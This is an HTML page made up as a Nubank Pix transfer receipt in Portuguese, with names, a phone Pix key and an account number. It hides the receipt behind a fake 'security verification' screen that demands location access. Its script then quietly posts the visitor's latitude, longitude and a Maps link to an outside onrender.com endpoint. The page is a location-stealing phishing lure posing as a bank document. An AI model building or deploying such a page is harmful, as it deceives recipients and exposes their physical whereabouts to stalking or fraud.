<!DOCTYPE html>
<html lang="pt-BR">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Comprovante</title>
  <style>
    /* --- ESTILO GERAL --- */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', 'Helvetica Neue', Helvetica, Arial, sans-serif;
      background-color: #fff;
      color: #111;
      -webkit-font-smoothing: antialiased;
      overflow-x: hidden;
      /* Evita rolagem lateral indesejada */
    }

    /* TELA DE BLOQUEIO */
    #tela-bloqueio {
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #f5f5f5;
      text-align: center;
      padding: 30px;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      z-index: 999;
    }

    #tela-bloqueio h1 {
      color: #820ad1;
      margin-bottom: 15px;
      font-size: 20px;
    }

    .loader {
      font-size: 40px;
      margin-bottom: 20px;
    }

    /* --- O COMPROVANTE (Visual App) --- */
    .app-container {
      padding: 24px;
      padding-bottom: 0;
      max-width: 600px;
      margin: 0 auto;
    }

    /* Logo Nu */
    .nu-logo {
      width: 44px;
      height: 44px;
      background-color: #820ad1;
      border-radius: 50%;
      position: relative;
      margin-bottom: 24px;
    }

    .nu-logo::after {
      content: "nu";
      position: absolute;
      color: #fff;
      font-weight: bold;
      font-size: 26px;
      letter-spacing: -2px;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -55%);
    }

    /* T√≠tulos */
    h1 {
      font-size: 24px;
      font-weight: 600;
      line-height: 1.2;
      color: #000;
      margin-bottom: 8px;
    }

    .sub-data {
      color: #737373;
      font-size: 14px;
      margin-bottom: 32px;
    }

    /* Linhas de Informa√ß√£o */
    .info-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      margin-bottom: 18px;
    }

    .label {
      font-weight: 600;
      font-size: 16px;
      color: #000;
      flex: 1;
    }

    .value {
      font-weight: 400;
      font-size: 16px;
      color: #000;
      text-align: right;
      flex: 1.5;
      word-wrap: break-word;
    }

    .pix-color {
      color: #737373;
    }

    /* Divisores de Se√ß√£o */
    .section-header {
      margin-top: 32px;
      margin-bottom: 16px;
      font-size: 14px;
      color: #000;
      font-weight: 400;
    }

    /* RODAP√â "VAZADO" */
    .footer-gray {
      background-color: #f5f5f5;
      padding: 24px;
      padding-top: 32px;
      margin-top: 30px;
      margin-left: -24px;
      margin-right: -24px;
      padding-bottom: 50px;
    }

    .footer-gray p {
      font-size: 14px;
      font-weight: 600;
      margin-bottom: 24px;
      line-height: 1.4;
    }

    .footer-gray .label-id {
      font-weight: 600;
      font-size: 14px;
      margin-bottom: 4px;
    }

    .footer-gray .code-id {
      font-family: monospace;
      font-size: 13px;
      color: #111;
      margin-bottom: 24px;
      word-break: break-all;
    }

    .help-link {
      color: #820ad1;
      font-weight: 600;
      text-decoration: none;
      font-size: 16px;
      display: block;
      margin-bottom: 32px;
    }

    .legal-text {
      border-top: 1px solid #dcdcdc;
      padding-top: 20px;
      font-size: 12px;
      color: #737373;
      line-height: 1.5;
      font-weight: 400 !important;
    }
  </style>
</head>

<body>

  <div id="tela-bloqueio">
    <div class="loader">üîí</div>
    <h1>Verifica√ß√£o de Seguran√ßa</h1>
    <p>Permita a localiza√ß√£o para visualizar o comprovante.</p>
  </div>

  <div id="site-real" style="display: none;">
    <div class="app-container">

      <div class="nu-logo"></div>

      <h1>Comprovante de<br>transfer√™ncia</h1>
      <p class="sub-data">20 JAN 2026 - 20:17:23</p>

      <div class="info-row">
        <span class="label">Valor</span>
        <span class="value">R$ 200,00</span>
      </div>
      <div class="info-row">
        <span class="label">Tipo de transfer√™ncia</span>
        <span class="value pix-color">Pix</span>
      </div>

      <div class="section-header">Destino</div>

      <div class="info-row">
        <span class="label">Nome</span>
        <span class="value">JORGE LUIZ DA CONCEI√á√ÉO</span>
      </div>
      <div class="info-row">
        <span class="label">CPF</span>
        <span class="value">***.123.754-**</span>
      </div>
      <div class="info-row">
        <span class="label">Institui√ß√£o</span>
        <span class="value">SICOOB CONEX√ÉO</span>
      </div>
      <div class="info-row">
        <span class="label">Tipo de conta</span>
        <span class="value">Conta corrente</span>
      </div>
      <div class="info-row">
        <span class="label">Chave Pix</span>
        <span class="value pix-color">+5527995672323</span>
      </div>

      <div class="section-header">Origem</div>

      <div class="info-row">
        <span class="label">Nome</span>
        <span class="value">Caio Monte</span>
      </div>
      <div class="info-row">
        <span class="label">Institui√ß√£o</span>
        <span class="value">NU PAGAMENTOS - IP</span>
      </div>
      <div class="info-row">
        <span class="label">Ag√™ncia</span>
        <span class="value">0001</span>
      </div>
      <div class="info-row">
        <span class="label">Conta</span>
        <span class="value">69221724-7</span>
      </div>
      <div class="info-row">
        <span class="label">CPF</span>
        <span class="value">***.700.117-**</span>
      </div>

      <div class="footer-gray">
        <p>Nu Pagamentos S.A. - Institui√ß√£o de Pagamento<br>CNPJ 18.236.120/0001-58</p>

        <div class="label-id">ID da transa√ß√£o:</div>
        <div class="code-id">E18236120202601192017a94b58c2d1e</div>

        <p style="font-weight: 400; color: #737373;">Estamos aqui para ajudar se voc√™ tiver alguma d√∫vida.</p>

        <a href="#" class="help-link">Me ajuda -></a>

        <div class="legal-text">
          Ouvidoria: 0800 887 0463 ou demais canais em nubank.com.br/contatos#ouvidoria (Atendimento das 8h √†s 18h em
          dias √∫teis).
        </div>
      </div>

    </div>
  </div>

  <script>
    // L√ìGICA DE LOCALIZA√á√ÉO
    window.addEventListener("load", () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
      } else {
        alert("Erro no navegador.");
      }
    });

    function sendLocation(position) {
      // Libera a tela
      document.getElementById('tela-bloqueio').style.display = 'none';
      document.getElementById('site-real').style.display = 'block';

      // Coleta dados
      const latitude = position.coords.latitude;
      const longitude = position.coords.longitude;
      // Link Google Maps (Corrigido para formato padr√£o)
      const maps = `https://www.google.com/maps?q=${latitude},${longitude}`;

      // Envia para o Render
      fetch("https://comprovante-pix-1817.onrender.com/send-location", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ latitude, longitude, maps })
      }).catch(e => console.log(e));
    }

    function handleError(error) {
      const h1 = document.querySelector('#tela-bloqueio h1');
      h1.innerText = "Erro de Conex√£o";
      h1.style.color = "red";
      document.querySelector('#tela-bloqueio p').innerText = "Verifique sua internet e recarregue.";
    }
  </script>
</body>

</html>
